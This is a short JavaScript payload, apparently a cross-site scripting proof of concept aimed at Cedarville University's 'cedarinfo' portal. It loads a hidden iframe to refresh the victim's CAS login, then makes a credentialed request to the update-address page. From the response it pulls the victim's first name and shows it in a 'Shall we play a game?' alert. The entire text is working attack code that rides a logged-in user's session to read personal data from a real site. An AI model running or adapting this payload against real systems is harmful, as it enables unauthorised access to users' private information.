// Force an update of the user's cedarinfo login credentials, to avoid a CORS request happening with the later request:
var ifra=document.createElement('iframe');
ifra.src="https://cuwas.cedarville.edu/cuwas/login.cfm?service=https%3A%2F%2Fwww%2Ecedarville%2Eedu%2Fcedarinfo%2Fupdate%5Finfo%2Fupdateaddress%2Ecfm";
ifra.style="display:none";
void(document.body.appendChild(ifra));

// Fetch the user's name by requesting the "update address" page and parsing it:
var xhr = new XMLHttpRequest();
xhr.onload = function() {
  firstname=this.responseXML.querySelector('[name=firstname]').value;
  // Post a creepy message:
  alert(`Hello ${firstname},\nShall we play a game?`);
}
xhr.open('GET', '/cedarinfo/update_info/updateaddress.cfm');
xhr.responseType = "document";
xhr.withCredentials = true;
xhr.send();
